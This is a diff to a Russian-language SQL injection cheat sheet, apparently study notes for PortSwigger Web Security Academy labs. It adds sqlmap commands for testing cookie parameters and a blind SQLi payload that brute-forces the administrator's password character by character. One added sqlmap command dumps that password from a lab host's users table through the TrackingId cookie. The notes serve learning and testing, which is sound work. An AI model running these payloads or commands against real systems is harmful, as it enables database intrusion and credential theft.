@@ -4,7 +4,8 @@ SQL-инъекция - это уязвимость веб-безопасност
 - [SQLi Cheat Sheet PortSwigger Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - База знаний: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ## Инструменты
-- [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`
+- [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`, 
+`sqlmap -u <url> --cookie='id=1; PHPSESSID=abcdef' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID' --level=2` (SQLi в куки `id`)
 ## Обнаружение SQLi
 - Вставка специальных символов в значение параметров: `'`, `"`, `\`
 - Булевы условия: `OR 1=1`, `OR 1=2`
@@ -38,4 +39,6 @@ SQL-инъекция - это уязвимость веб-безопасност
 ### Blind
 Слепая SQLi (blind SQLi) возникает, когда приложение уязвимо к SQLi, но HTTP-ответы приложения не содержат результаты выполнения SQLi или ошибок БД.
 #### Blind SQLi на основе условных ответов
-Если атакующий может управлять условием, от выполнения которого зависит ответ приложения (если `true` - один ответ, если `false`- другой ответ), он может реализовать Blind SQLi. Обычно атака реализуется путем перебора всех символов строки, которая интересует атакующего. Если символов содержится в строке на определенном месте, приложение отвечает одним образом. Если не содержится, другим. Пример SQLi: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'a` (условие проверяет, что первый символ пароля администратора - символ `a`). 
+Если атакующий может управлять условием, от выполнения которого зависит ответ приложения (если `true` - один ответ, если `false`- другой ответ), он может реализовать Blind SQLi. Обычно атака реализуется путем перебора всех символов строки, которая интересует атакующего. Если символов содержится в строке на определенном месте, приложение отвечает одним образом. Если не содержится, другим. 
+Пример SQLi: `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a` (условие проверяет, что первый символ пароля администратора - символ `a`). 
+Пример запроса sqlmap: `sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump` (дамп пароля администратора из таблицы `users` схемы `public` через SQLi в куки `TrackingId`).
